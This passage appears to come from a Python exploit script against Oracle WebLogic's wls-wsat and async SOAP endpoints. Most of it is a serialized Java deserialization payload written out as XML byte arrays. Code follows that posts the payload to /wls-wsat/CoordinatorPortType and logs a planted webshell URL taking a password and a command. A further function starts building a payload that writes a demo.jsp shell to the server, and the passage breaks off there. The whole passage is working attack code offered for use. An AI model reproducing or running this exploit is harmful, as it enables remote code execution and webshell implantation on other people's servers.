index=\"3635\"><byte>101</byte></void><void index=\"3636\"><byte>115</byte></void><void index=\"3637\"><byte>1</byte></void><void index=\"3638\"><byte>0</byte></void><void index=\"3639\"><byte>37</byte></void><void index=\"3640\"><byte>76</byte></void><void index=\"3641\"><byte>121</byte></void><void index=\"3642\"><byte>115</byte></void><void index=\"3643\"><byte>111</byte></void><void index=\"3644\"><byte>115</byte></void><void index=\"3645\"><byte>101</byte></void><void index=\"3646\"><byte>114</byte></void><void index=\"3647\"><byte>105</byte></void><void index=\"3648\"><byte>97</byte></void><void index=\"3649\"><byte>108</byte></void><void index=\"3650\"><byte>47</byte></void><void index=\"3651\"><byte>112</byte></void><void index=\"3652\"><byte>97</byte></void><void index=\"3653\"><byte>121</byte></void><void index=\"3654\"><byte>108</byte></void><void index=\"3655\"><byte>111</byte></void><void index=\"3656\"><byte>97</byte></void><void index=\"3657\"><byte>100</byte></void><void index=\"3658\"><byte>115</byte></void><void index=\"3659\"><byte>47</byte></void><void index=\"3660\"><byte>117</byte></void><void index=\"3661\"><byte>116</byte></void><void index=\"3662\"><byte>105</byte></void><void index=\"3663\"><byte>108</byte></void><void index=\"3664\"><byte>47</byte></void><void index=\"3665\"><byte>71</byte></void><void index=\"3666\"><byte>97</byte></void><void index=\"3667\"><byte>100</byte></void><void index=\"3668\"><byte>103</byte></void><void index=\"3669\"><byte>101</byte></void><void index=\"3670\"><byte>116</byte></void><void index=\"3671\"><byte>115</byte></void><void index=\"3672\"><byte>36</byte></void><void index=\"3673\"><byte>70</byte></void><void index=\"3674\"><byte>111</byte></void><void index=\"3675\"><byte>111</byte></void><void index=\"3676\"><byte>59</byte></void><void index=\"3677\"><byte>1</byte></void><void index=\"3678\"><byte>0</byte></void><void index=\"3679\"><byte>10</byte></void><void index=\"3680\"><byte>83</byte></void><void index=\"3681\"><byte>111</byte></void><void index=\"3682\"><byte>117</byte></void><void index=\"3683\"><byte>114</byte></void><void index=\"3684\"><byte>99</byte></void><void index=\"3685\"><byte>101</byte></void><void index=\"3686\"><byte>70</byte></void><void index=\"3687\"><byte>105</byte></void><void index=\"3688\"><byte>108</byte></void><void index=\"3689\"><byte>101</byte></void><void index=\"3690\"><byte>1</byte></void><void index=\"3691\"><byte>0</byte></void><void index=\"3692\"><byte>12</byte></void><void index=\"3693\"><byte>71</byte></void><void index=\"3694\"><byte>97</byte></void><void index=\"3695\"><byte>100</byte></void><void index=\"3696\"><byte>103</byte></void><void index=\"3697\"><byte>101</byte></void><void index=\"3698\"><byte>116</byte></void><void index=\"3699\"><byte>115</byte></void><void index=\"3700\"><byte>46</byte></void><void index=\"3701\"><byte>106</byte></void><void index=\"3702\"><byte>97</byte></void><void index=\"3703\"><byte>118</byte></void><void index=\"3704\"><byte>97</byte></void><void index=\"3705\"><byte>12</byte></void><void index=\"3706\"><byte>0</byte></void><void index=\"3707\"><byte>10</byte></void><void index=\"3708\"><byte>0</byte></void><void index=\"3709\"><byte>11</byte></void><void index=\"3710\"><byte>7</byte></void><void index=\"3711\"><byte>0</byte></void><void index=\"3712\"><byte>26</byte></void><void index=\"3713\"><byte>1</byte></void><void index=\"3714\"><byte>0</byte></void><void index=\"3715\"><byte>35</byte></void><void index=\"3716\"><byte>121</byte></void><void index=\"3717\"><byte>115</byte></void><void index=\"3718\"><byte>111</byte></void><void index=\"3719\"><byte>115</byte></void><void index=\"3720\"><byte>101</byte></void><void index=\"3721\"><byte>114</byte></void><void index=\"3722\"><byte>105</byte></void><void index=\"3723\"><byte>97</byte></void><void index=\"3724\"><byte>108</byte></void><void index=\"3725\"><byte>47</byte></void><void index=\"3726\"><byte>112</byte></void><void index=\"3727\"><byte>97</byte></void><void index=\"3728\"><byte>121</byte></void><void index=\"3729\"><byte>108</byte></void><void index=\"3730\"><byte>111</byte></void><void index=\"3731\"><byte>97</byte></void><void index=\"3732\"><byte>100</byte></void><void index=\"3733\"><byte>115</byte></void><void index=\"3734\"><byte>47</byte></void><void index=\"3735\"><byte>117</byte></void><void index=\"3736\"><byte>116</byte></void><void index=\"3737\"><byte>105</byte></void><void index=\"3738\"><byte>108</byte></void><void index=\"3739\"><byte>47</byte></void><void index=\"3740\"><byte>71</byte></void><void index=\"3741\"><byte>97</byte></void><void index=\"3742\"><byte>100</byte></void><void index=\"3743\"><byte>103</byte></void><void index=\"3744\"><byte>101</byte></void><void index=\"3745\"><byte>116</byte></void><void index=\"3746\"><byte>115</byte></void><void index=\"3747\"><byte>36</byte></void><void index=\"3748\"><byte>70</byte></void><void index=\"3749\"><byte>111</byte></void><void index=\"3750\"><byte>111</byte></void><void index=\"3751\"><byte>1</byte></void><void index=\"3752\"><byte>0</byte></void><void index=\"3753\"><byte>16</byte></void><void index=\"3754\"><byte>106</byte></void><void index=\"3755\"><byte>97</byte></void><void index=\"3756\"><byte>118</byte></void><void index=\"3757\"><byte>97</byte></void><void index=\"3758\"><byte>47</byte></void><void index=\"3759\"><byte>108</byte></void><void index=\"3760\"><byte>97</byte></void><void index=\"3761\"><byte>110</byte></void><void index=\"3762\"><byte>103</byte></void><void index=\"3763\"><byte>47</byte></void><void index=\"3764\"><byte>79</byte></void><void index=\"3765\"><byte>98</byte></void><void index=\"3766\"><byte>106</byte></void><void index=\"3767\"><byte>101</byte></void><void index=\"3768\"><byte>99</byte></void><void index=\"3769\"><byte>116</byte></void><void index=\"3770\"><byte>1</byte></void><void index=\"3771\"><byte>0</byte></void><void index=\"3772\"><byte>20</byte></void><void index=\"3773\"><byte>106</byte></void><void index=\"3774\"><byte>97</byte></void><void index=\"3775\"><byte>118</byte></void><void index=\"3776\"><byte>97</byte></void><void index=\"3777\"><byte>47</byte></void><void index=\"3778\"><byte>105</byte></void><void index=\"3779\"><byte>111</byte></void><void index=\"3780\"><byte>47</byte></void><void index=\"3781\"><byte>83</byte></void><void index=\"3782\"><byte>101</byte></void><void index=\"3783\"><byte>114</byte></void><void index=\"3784\"><byte>105</byte></void><void index=\"3785\"><byte>97</byte></void><void index=\"3786\"><byte>108</byte></void><void index=\"3787\"><byte>105</byte></void><void index=\"3788\"><byte>122</byte></void><void index=\"3789\"><byte>97</byte></void><void index=\"3790\"><byte>98</byte></void><void index=\"3791\"><byte>108</byte></void><void index=\"3792\"><byte>101</byte></void><void index=\"3793\"><byte>1</byte></void><void index=\"3794\"><byte>0</byte></void><void index=\"3795\"><byte>31</byte></void><void index=\"3796\"><byte>121</byte></void><void index=\"3797\"><byte>115</byte></void><void index=\"3798\"><byte>111</byte></void><void index=\"3799\"><byte>115</byte></void><void index=\"3800\"><byte>101</byte></void><void index=\"3801\"><byte>114</byte></void><void index=\"3802\"><byte>105</byte></void><void index=\"3803\"><byte>97</byte></void><void index=\"3804\"><byte>108</byte></void><void index=\"3805\"><byte>47</byte></void><void index=\"3806\"><byte>112</byte></void><void index=\"3807\"><byte>97</byte></void><void index=\"3808\"><byte>121</byte></void><void index=\"3809\"><byte>108</byte></void><void index=\"3810\"><byte>111</byte></void><void index=\"3811\"><byte>97</byte></void><void index=\"3812\"><byte>100</byte></void><void index=\"3813\"><byte>115</byte></void><void index=\"3814\"><byte>47</byte></void><void index=\"3815\"><byte>117</byte></void><void index=\"3816\"><byte>116</byte></void><void index=\"3817\"><byte>105</byte></void><void index=\"3818\"><byte>108</byte></void><void index=\"3819\"><byte>47</byte></void><void index=\"3820\"><byte>71</byte></void><void index=\"3821\"><byte>97</byte></void><void index=\"3822\"><byte>100</byte></void><void index=\"3823\"><byte>103</byte></void><void index=\"3824\"><byte>101</byte></void><void index=\"3825\"><byte>116</byte></void><void index=\"3826\"><byte>115</byte></void><void index=\"3827\"><byte>0</byte></void><void index=\"3828\"><byte>33</byte></void><void index=\"3829\"><byte>0</byte></void><void index=\"3830\"><byte>2</byte></void><void index=\"3831\"><byte>0</byte></void><void index=\"3832\"><byte>3</byte></void><void index=\"3833\"><byte>0</byte></void><void index=\"3834\"><byte>1</byte></void><void index=\"3835\"><byte>0</byte></void><void index=\"3836\"><byte>4</byte></void><void index=\"3837\"><byte>0</byte></void><void index=\"3838\"><byte>1</byte></void><void index=\"3839\"><byte>0</byte></void><void index=\"3840\"><byte>26</byte></void><void index=\"3841\"><byte>0</byte></void><void index=\"3842\"><byte>5</byte></void><void index=\"3843\"><byte>0</byte></void><void index=\"3844\"><byte>6</byte></void><void index=\"3845\"><byte>0</byte></void><void index=\"3846\"><byte>1</byte></void><void index=\"3847\"><byte>0</byte></void><void index=\"3848\"><byte>7</byte></void><void index=\"3849\"><byte>0</byte></void><void index=\"3850\"><byte>0</byte></void><void index=\"3851\"><byte>0</byte></void><void index=\"3852\"><byte>2</byte></void><void index=\"3853\"><byte>0</byte></void><void index=\"3854\"><byte>8</byte></void><void index=\"3855\"><byte>0</byte></void><void index=\"3856\"><byte>1</byte></void><void index=\"3857\"><byte>0</byte></void><void index=\"3858\"><byte>1</byte></void><void index=\"3859\"><byte>0</byte></void><void index=\"3860\"><byte>10</byte></void><void index=\"3861\"><byte>0</byte></void><void index=\"3862\"><byte>11</byte></void><void index=\"3863\"><byte>0</byte></void><void index=\"3864\"><byte>1</byte></void><void index=\"3865\"><byte>0</byte></void><void index=\"3866\"><byte>12</byte></void><void index=\"3867\"><byte>0</byte></void><void index=\"3868\"><byte>0</byte></void><void index=\"3869\"><byte>0</byte></void><void index=\"3870\"><byte>47</byte></void><void index=\"3871\"><byte>0</byte></void><void index=\"3872\"><byte>1</byte></void><void index=\"3873\"><byte>0</byte></void><void index=\"3874\"><byte>1</byte></void><void index=\"3875\"><byte>0</byte></void><void index=\"3876\"><byte>0</byte></void><void index=\"3877\"><byte>0</byte></void><void index=\"3878\"><byte>5</byte></void><void index=\"3879\"><byte>42</byte></void><void index=\"3880\"><byte>-73</byte></void><void index=\"3881\"><byte>0</byte></void><void index=\"3882\"><byte>1</byte></void><void index=\"3883\"><byte>-79</byte></void><void index=\"3884\"><byte>0</byte></void><void index=\"3885\"><byte>0</byte></void><void index=\"3886\"><byte>0</byte></void><void index=\"3887\"><byte>2</byte></void><void index=\"3888\"><byte>0</byte></void><void index=\"3889\"><byte>13</byte></void><void index=\"3890\"><byte>0</byte></void><void index=\"3891\"><byte>0</byte></void><void index=\"3892\"><byte>0</byte></void><void index=\"3893\"><byte>6</byte></void><void index=\"3894\"><byte>0</byte></void><void index=\"3895\"><byte>1</byte></void><void index=\"3896\"><byte>0</byte></void><void index=\"3897\"><byte>0</byte></void><void index=\"3898\"><byte>0</byte></void><void index=\"3899\"><byte>60</byte></void><void index=\"3900\"><byte>0</byte></void><void index=\"3901\"><byte>14</byte></void><void index=\"3902\"><byte>0</byte></void><void index=\"3903\"><byte>0</byte></void><void index=\"3904\"><byte>0</byte></void><void index=\"3905\"><byte>12</byte></void><void index=\"3906\"><byte>0</byte></void><void index=\"3907\"><byte>1</byte></void><void index=\"3908\"><byte>0</byte></void><void index=\"3909\"><byte>0</byte></void><void index=\"3910\"><byte>0</byte></void><void index=\"3911\"><byte>5</byte></void><void index=\"3912\"><byte>0</byte></void><void index=\"3913\"><byte>15</byte></void><void index=\"3914\"><byte>0</byte></void><void index=\"3915\"><byte>18</byte></void><void index=\"3916\"><byte>0</byte></void><void index=\"3917\"><byte>0</byte></void><void index=\"3918\"><byte>0</byte></void><void index=\"3919\"><byte>2</byte></void><void index=\"3920\"><byte>0</byte></void><void index=\"3921\"><byte>19</byte></void><void index=\"3922\"><byte>0</byte></void><void index=\"3923\"><byte>0</byte></void><void index=\"3924\"><byte>0</byte></void><void index=\"3925\"><byte>2</byte></void><void index=\"3926\"><byte>0</byte></void><void index=\"3927\"><byte>20</byte></void><void index=\"3928\"><byte>0</byte></void><void index=\"3929\"><byte>17</byte></void><void index=\"3930\"><byte>0</byte></void><void index=\"3931\"><byte>0</byte></void><void index=\"3932\"><byte>0</byte></void><void index=\"3933\"><byte>10</byte></void><void index=\"3934\"><byte>0</byte></void><void index=\"3935\"><byte>1</byte></void><void index=\"3936\"><byte>0</byte></void><void index=\"3937\"><byte>2</byte></void><void index=\"3938\"><byte>0</byte></void><void index=\"3939\"><byte>22</byte></void><void index=\"3940\"><byte>0</byte></void><void index=\"3941\"><byte>16</byte></void><void index=\"3942\"><byte>0</byte></void><void index=\"3943\"><byte>9</byte></void><void index=\"3944\"><byte>112</byte></void><void index=\"3945\"><byte>116</byte></void><void index=\"3946\"><byte>0</byte></void><void index=\"3947\"><byte>4</byte></void><void index=\"3948\"><byte>80</byte></void><void index=\"3949\"><byte>119</byte></void><void index=\"3950\"><byte>110</byte></void><void index=\"3951\"><byte>114</byte></void><void index=\"3952\"><byte>112</byte></void><void index=\"3953\"><byte>119</byte></void><void index=\"3954\"><byte>1</byte></void><void index=\"3955\"><byte>0</byte></void><void index=\"3956\"><byte>120</byte></void><void index=\"3957\"><byte>115</byte></void><void index=\"3958\"><byte>125</byte></void><void index=\"3959\"><byte>0</byte></void><void index=\"3960\"><byte>0</byte></void><void index=\"3961\"><byte>0</byte></void><void index=\"3962\"><byte>1</byte></void><void index=\"3963\"><byte>0</byte></void><void index=\"3964\"><byte>29</byte></void><void index=\"3965\"><byte>106</byte></void><void index=\"3966\"><byte>97</byte></void><void index=\"3967\"><byte>118</byte></void><void index=\"3968\"><byte>97</byte></void><void index=\"3969\"><byte>120</byte></void><void index=\"3970\"><byte>46</byte></void><void index=\"3971\"><byte>120</byte></void><void index=\"3972\"><byte>109</byte></void><void index=\"3973\"><byte>108</byte></void><void index=\"3974\"><byte>46</byte></void><void index=\"3975\"><byte>116</byte></void><void index=\"3976\"><byte>114</byte></void><void index=\"3977\"><byte>97</byte></void><void index=\"3978\"><byte>110</byte></void><void index=\"3979\"><byte>115</byte></void><void index=\"3980\"><byte>102</byte></void><void index=\"3981\"><byte>111</byte></void><void index=\"3982\"><byte>114</byte></void><void index=\"3983\"><byte>109</byte></void><void index=\"3984\"><byte>46</byte></void><void index=\"3985\"><byte>84</byte></void><void index=\"3986\"><byte>101</byte></void><void index=\"3987\"><byte>109</byte></void><void index=\"3988\"><byte>112</byte></void><void index=\"3989\"><byte>108</byte></void><void index=\"3990\"><byte>97</byte></void><void index=\"3991\"><byte>116</byte></void><void index=\"3992\"><byte>101</byte></void><void index=\"3993\"><byte>115</byte></void><void index=\"3994\"><byte>120</byte></void><void index=\"3995\"><byte>114</byte></void><void index=\"3996\"><byte>0</byte></void><void index=\"3997\"><byte>23</byte></void><void index=\"3998\"><byte>106</byte></void><void index=\"3999\"><byte>97</byte></void><void index=\"4000\"><byte>118</byte></void><void index=\"4001\"><byte>97</byte></void><void index=\"4002\"><byte>46</byte></void><void index=\"4003\"><byte>108</byte></void><void index=\"4004\"><byte>97</byte></void><void index=\"4005\"><byte>110</byte></void><void index=\"4006\"><byte>103</byte></void><void index=\"4007\"><byte>46</byte></void><void index=\"4008\"><byte>114</byte></void><void index=\"4009\"><byte>101</byte></void><void index=\"4010\"><byte>102</byte></void><void index=\"4011\"><byte>108</byte></void><void index=\"4012\"><byte>101</byte></void><void index=\"4013\"><byte>99</byte></void><void index=\"4014\"><byte>116</byte></void><void index=\"4015\"><byte>46</byte></void><void index=\"4016\"><byte>80</byte></void><void index=\"4017\"><byte>114</byte></void><void index=\"4018\"><byte>111</byte></void><void index=\"4019\"><byte>120</byte></void><void index=\"4020\"><byte>121</byte></void><void index=\"4021\"><byte>-31</byte></void><void index=\"4022\"><byte>39</byte></void><void index=\"4023\"><byte>-38</byte></void><void index=\"4024\"><byte>32</byte></void><void index=\"4025\"><byte>-52</byte></void><void index=\"4026\"><byte>16</byte></void><void index=\"4027\"><byte>67</byte></void><void index=\"4028\"><byte>-53</byte></void><void index=\"4029\"><byte>2</byte></void><void index=\"4030\"><byte>0</byte></void><void index=\"4031\"><byte>1</byte></void><void index=\"4032\"><byte>76</byte></void><void index=\"4033\"><byte>0</byte></void><void index=\"4034\"><byte>1</byte></void><void index=\"4035\"><byte>104</byte></void><void index=\"4036\"><byte>116</byte></void><void index=\"4037\"><byte>0</byte></void><void index=\"4038\"><byte>37</byte></void><void index=\"4039\"><byte>76</byte></void><void index=\"4040\"><byte>106</byte></void><void index=\"4041\"><byte>97</byte></void><void index=\"4042\"><byte>118</byte></void><void index=\"4043\"><byte>97</byte></void><void index=\"4044\"><byte>47</byte></void><void index=\"4045\"><byte>108</byte></void><void index=\"4046\"><byte>97</byte></void><void index=\"4047\"><byte>110</byte></void><void index=\"4048\"><byte>103</byte></void><void index=\"4049\"><byte>47</byte></void><void index=\"4050\"><byte>114</byte></void><void index=\"4051\"><byte>101</byte></void><void index=\"4052\"><byte>102</byte></void><void index=\"4053\"><byte>108</byte></void><void index=\"4054\"><byte>101</byte></void><void index=\"4055\"><byte>99</byte></void><void index=\"4056\"><byte>116</byte></void><void index=\"4057\"><byte>47</byte></void><void index=\"4058\"><byte>73</byte></void><void index=\"4059\"><byte>110</byte></void><void index=\"4060\"><byte>118</byte></void><void index=\"4061\"><byte>111</byte></void><void index=\"4062\"><byte>99</byte></void><void index=\"4063\"><byte>97</byte></void><void index=\"4064\"><byte>116</byte></void><void index=\"4065\"><byte>105</byte></void><void index=\"4066\"><byte>111</byte></void><void index=\"4067\"><byte>110</byte></void><void index=\"4068\"><byte>72</byte></void><void index=\"4069\"><byte>97</byte></void><void index=\"4070\"><byte>110</byte></void><void index=\"4071\"><byte>100</byte></void><void index=\"4072\"><byte>108</byte></void><void index=\"4073\"><byte>101</byte></void><void index=\"4074\"><byte>114</byte></void><void index=\"4075\"><byte>59</byte></void><void index=\"4076\"><byte>120</byte></void><void index=\"4077\"><byte>112</byte></void><void index=\"4078\"><byte>115</byte></void><void index=\"4079\"><byte>114</byte></void><void index=\"4080\"><byte>0</byte></void><void index=\"4081\"><byte>50</byte></void><void index=\"4082\"><byte>115</byte></void><void index=\"4083\"><byte>117</byte></void><void index=\"4084\"><byte>110</byte></void><void index=\"4085\"><byte>46</byte></void><void index=\"4086\"><byte>114</byte></void><void index=\"4087\"><byte>101</byte></void><void index=\"4088\"><byte>102</byte></void><void index=\"4089\"><byte>108</byte></void><void index=\"4090\"><byte>101</byte></void><void index=\"4091\"><byte>99</byte></void><void index=\"4092\"><byte>116</byte></void><void index=\"4093\"><byte>46</byte></void><void index=\"4094\"><byte>97</byte></void><void index=\"4095\"><byte>110</byte></void><void index=\"4096\"><byte>110</byte></void><void index=\"4097\"><byte>111</byte></void><void index=\"4098\"><byte>116</byte></void><void index=\"4099\"><byte>97</byte></void><void index=\"4100\"><byte>116</byte></void><void index=\"4101\"><byte>105</byte></void><void index=\"4102\"><byte>111</byte></void><void index=\"4103\"><byte>110</byte></void><void index=\"4104\"><byte>46</byte></void><void index=\"4105\"><byte>65</byte></void><void index=\"4106\"><byte>110</byte></void><void index=\"4107\"><byte>110</byte></void><void index=\"4108\"><byte>111</byte></void><void index=\"4109\"><byte>116</byte></void><void index=\"4110\"><byte>97</byte></void><void index=\"4111\"><byte>116</byte></void><void index=\"4112\"><byte>105</byte></void><void index=\"4113\"><byte>111</byte></void><void index=\"4114\"><byte>110</byte></void><void index=\"4115\"><byte>73</byte></void><void index=\"4116\"><byte>110</byte></void><void index=\"4117\"><byte>118</byte></void><void index=\"4118\"><byte>111</byte></void><void index=\"4119\"><byte>99</byte></void><void index=\"4120\"><byte>97</byte></void><void index=\"4121\"><byte>116</byte></void><void index=\"4122\"><byte>105</byte></void><void index=\"4123\"><byte>111</byte></void><void index=\"4124\"><byte>110</byte></void><void index=\"4125\"><byte>72</byte></void><void index=\"4126\"><byte>97</byte></void><void index=\"4127\"><byte>110</byte></void><void index=\"4128\"><byte>100</byte></void><void index=\"4129\"><byte>108</byte></void><void index=\"4130\"><byte>101</byte></void><void index=\"4131\"><byte>114</byte></void><void index=\"4132\"><byte>85</byte></void><void index=\"4133\"><byte>-54</byte></void><void index=\"4134\"><byte>-11</byte></void><void index=\"4135\"><byte>15</byte></void><void index=\"4136\"><byte>21</byte></void><void index=\"4137\"><byte>-53</byte></void><void index=\"4138\"><byte>126</byte></void><void index=\"4139\"><byte>-91</byte></void><void index=\"4140\"><byte>2</byte></void><void index=\"4141\"><byte>0</byte></void><void index=\"4142\"><byte>2</byte></void><void index=\"4143\"><byte>76</byte></void><void index=\"4144\"><byte>0</byte></void><void index=\"4145\"><byte>12</byte></void><void index=\"4146\"><byte>109</byte></void><void index=\"4147\"><byte>101</byte></void><void index=\"4148\"><byte>109</byte></void><void index=\"4149\"><byte>98</byte></void><void index=\"4150\"><byte>101</byte></void><void index=\"4151\"><byte>114</byte></void><void index=\"4152\"><byte>86</byte></void><void index=\"4153\"><byte>97</byte></void><void index=\"4154\"><byte>108</byte></void><void index=\"4155\"><byte>117</byte></void><void index=\"4156\"><byte>101</byte></void><void index=\"4157\"><byte>115</byte></void><void index=\"4158\"><byte>116</byte></void><void index=\"4159\"><byte>0</byte></void><void index=\"4160\"><byte>15</byte></void><void index=\"4161\"><byte>76</byte></void><void index=\"4162\"><byte>106</byte></void><void index=\"4163\"><byte>97</byte></void><void index=\"4164\"><byte>118</byte></void><void index=\"4165\"><byte>97</byte></void><void index=\"4166\"><byte>47</byte></void><void index=\"4167\"><byte>117</byte></void><void index=\"4168\"><byte>116</byte></void><void index=\"4169\"><byte>105</byte></void><void index=\"4170\"><byte>108</byte></void><void index=\"4171\"><byte>47</byte></void><void index=\"4172\"><byte>77</byte></void><void index=\"4173\"><byte>97</byte></void><void index=\"4174\"><byte>112</byte></void><void index=\"4175\"><byte>59</byte></void><void index=\"4176\"><byte>76</byte></void><void index=\"4177\"><byte>0</byte></void><void index=\"4178\"><byte>4</byte></void><void index=\"4179\"><byte>116</byte></void><void index=\"4180\"><byte>121</byte></void><void index=\"4181\"><byte>112</byte></void><void index=\"4182\"><byte>101</byte></void><void index=\"4183\"><byte>116</byte></void><void index=\"4184\"><byte>0</byte></void><void index=\"4185\"><byte>17</byte></void><void index=\"4186\"><byte>76</byte></void><void index=\"4187\"><byte>106</byte></void><void index=\"4188\"><byte>97</byte></void><void index=\"4189\"><byte>118</byte></void><void index=\"4190\"><byte>97</byte></void><void index=\"4191\"><byte>47</byte></void><void index=\"4192\"><byte>108</byte></void><void index=\"4193\"><byte>97</byte></void><void index=\"4194\"><byte>110</byte></void><void index=\"4195\"><byte>103</byte></void><void index=\"4196\"><byte>47</byte></void><void index=\"4197\"><byte>67</byte></void><void index=\"4198\"><byte>108</byte></void><void index=\"4199\"><byte>97</byte></void><void index=\"4200\"><byte>115</byte></void><void index=\"4201\"><byte>115</byte></void><void index=\"4202\"><byte>59</byte></void><void index=\"4203\"><byte>120</byte></void><void index=\"4204\"><byte>112</byte></void><void index=\"4205\"><byte>115</byte></void><void index=\"4206\"><byte>114</byte></void><void index=\"4207\"><byte>0</byte></void><void index=\"4208\"><byte>17</byte></void><void index=\"4209\"><byte>106</byte></void><void index=\"4210\"><byte>97</byte></void><void index=\"4211\"><byte>118</byte></void><void index=\"4212\"><byte>97</byte></void><void index=\"4213\"><byte>46</byte></void><void index=\"4214\"><byte>117</byte></void><void index=\"4215\"><byte>116</byte></void><void index=\"4216\"><byte>105</byte></void><void index=\"4217\"><byte>108</byte></void><void index=\"4218\"><byte>46</byte></void><void index=\"4219\"><byte>72</byte></void><void index=\"4220\"><byte>97</byte></void><void index=\"4221\"><byte>115</byte></void><void index=\"4222\"><byte>104</byte></void><void index=\"4223\"><byte>77</byte></void><void index=\"4224\"><byte>97</byte></void><void index=\"4225\"><byte>112</byte></void><void index=\"4226\"><byte>5</byte></void><void index=\"4227\"><byte>7</byte></void><void index=\"4228\"><byte>-38</byte></void><void index=\"4229\"><byte>-63</byte></void><void index=\"4230\"><byte>-61</byte></void><void index=\"4231\"><byte>22</byte></void><void index=\"4232\"><byte>96</byte></void><void index=\"4233\"><byte>-47</byte></void><void index=\"4234\"><byte>3</byte></void><void index=\"4235\"><byte>0</byte></void><void index=\"4236\"><byte>2</byte></void><void index=\"4237\"><byte>70</byte></void><void index=\"4238\"><byte>0</byte></void><void index=\"4239\"><byte>10</byte></void><void index=\"4240\"><byte>108</byte></void><void index=\"4241\"><byte>111</byte></void><void index=\"4242\"><byte>97</byte></void><void index=\"4243\"><byte>100</byte></void><void index=\"4244\"><byte>70</byte></void><void index=\"4245\"><byte>97</byte></void><void index=\"4246\"><byte>99</byte></void><void index=\"4247\"><byte>116</byte></void><void index=\"4248\"><byte>111</byte></void><void index=\"4249\"><byte>114</byte></void><void index=\"4250\"><byte>73</byte></void><void index=\"4251\"><byte>0</byte></void><void index=\"4252\"><byte>9</byte></void><void index=\"4253\"><byte>116</byte></void><void index=\"4254\"><byte>104</byte></void><void index=\"4255\"><byte>114</byte></void><void index=\"4256\"><byte>101</byte></void><void index=\"4257\"><byte>115</byte></void><void index=\"4258\"><byte>104</byte></void><void index=\"4259\"><byte>111</byte></void><void index=\"4260\"><byte>108</byte></void><void index=\"4261\"><byte>100</byte></void><void index=\"4262\"><byte>120</byte></void><void index=\"4263\"><byte>112</byte></void><void index=\"4264\"><byte>63</byte></void><void index=\"4265\"><byte>64</byte></void><void index=\"4266\"><byte>0</byte></void><void index=\"4267\"><byte>0</byte></void><void index=\"4268\"><byte>0</byte></void><void index=\"4269\"><byte>0</byte></void><void index=\"4270\"><byte>0</byte></void><void index=\"4271\"><byte>12</byte></void><void index=\"4272\"><byte>119</byte></void><void index=\"4273\"><byte>8</byte></void><void index=\"4274\"><byte>0</byte></void><void index=\"4275\"><byte>0</byte></void><void index=\"4276\"><byte>0</byte></void><void index=\"4277\"><byte>16</byte></void><void index=\"4278\"><byte>0</byte></void><void index=\"4279\"><byte>0</byte></void><void index=\"4280\"><byte>0</byte></void><void index=\"4281\"><byte>1</byte></void><void index=\"4282\"><byte>116</byte></void><void index=\"4283\"><byte>0</byte></void><void index=\"4284\"><byte>8</byte></void><void index=\"4285\"><byte>102</byte></void><void index=\"4286\"><byte>53</byte></void><void index=\"4287\"><byte>97</byte></void><void index=\"4288\"><byte>53</byte></void><void index=\"4289\"><byte>97</byte></void><void index=\"4290\"><byte>54</byte></void><void index=\"4291\"><byte>48</byte></void><void index=\"4292\"><byte>56</byte></void><void index=\"4293\"><byte>113</byte></void><void index=\"4294\"><byte>0</byte></void><void index=\"4295\"><byte>126</byte></void><void index=\"4296\"><byte>0</byte></void><void index=\"4297\"><byte>9</byte></void><void index=\"4298\"><byte>120</byte></void><void index=\"4299\"><byte>118</byte></void><void index=\"4300\"><byte>114</byte></void><void index=\"4301\"><byte>0</byte></void><void index=\"4302\"><byte>29</byte></void><void index=\"4303\"><byte>106</byte></void><void index=\"4304\"><byte>97</byte></void><void index=\"4305\"><byte>118</byte></void><void index=\"4306\"><byte>97</byte></void><void index=\"4307\"><byte>120</byte></void><void index=\"4308\"><byte>46</byte></void><void index=\"4309\"><byte>120</byte></void><void index=\"4310\"><byte>109</byte></void><void index=\"4311\"><byte>108</byte></void><void index=\"4312\"><byte>46</byte></void><void index=\"4313\"><byte>116</byte></void><void index=\"4314\"><byte>114</byte></void><void index=\"4315\"><byte>97</byte></void><void index=\"4316\"><byte>110</byte></void><void index=\"4317\"><byte>115</byte></void><void index=\"4318\"><byte>102</byte></void><void index=\"4319\"><byte>111</byte></void><void index=\"4320\"><byte>114</byte></void><void index=\"4321\"><byte>109</byte></void><void index=\"4322\"><byte>46</byte></void><void index=\"4323\"><byte>84</byte></void><void index=\"4324\"><byte>101</byte></void><void index=\"4325\"><byte>109</byte></void><void index=\"4326\"><byte>112</byte></void><void index=\"4327\"><byte>108</byte></void><void index=\"4328\"><byte>97</byte></void><void index=\"4329\"><byte>116</byte></void><void index=\"4330\"><byte>101</byte></void><void index=\"4331\"><byte>115</byte></void><void index=\"4332\"><byte>0</byte></void><void index=\"4333\"><byte>0</byte></void><void index=\"4334\"><byte>0</byte></void><void index=\"4335\"><byte>0</byte></void><void index=\"4336\"><byte>0</byte></void><void index=\"4337\"><byte>0</byte></void><void index=\"4338\"><byte>0</byte></void><void index=\"4339\"><byte>0</byte></void><void index=\"4340\"><byte>0</byte></void><void index=\"4341\"><byte>0</byte></void><void index=\"4342\"><byte>0</byte></void><void index=\"4343\"><byte>120</byte></void><void index=\"4344\"><byte>112</byte></void><void index=\"4345\"><byte>120</byte></void></array> </void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>''' url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n Shell\u5730\u5740\uff1a %s /bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\" % ( ip )) #print(\"Shell\u5730\u5740\uff1a %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) def webshell_12_1_3 ( ip ): body = '''<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>org.slf4j.ext.EventData</string><void><string> <![CDATA[<java> <object class=\"java.io.PrintWriter\"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp</string> <void method=\"println\"> 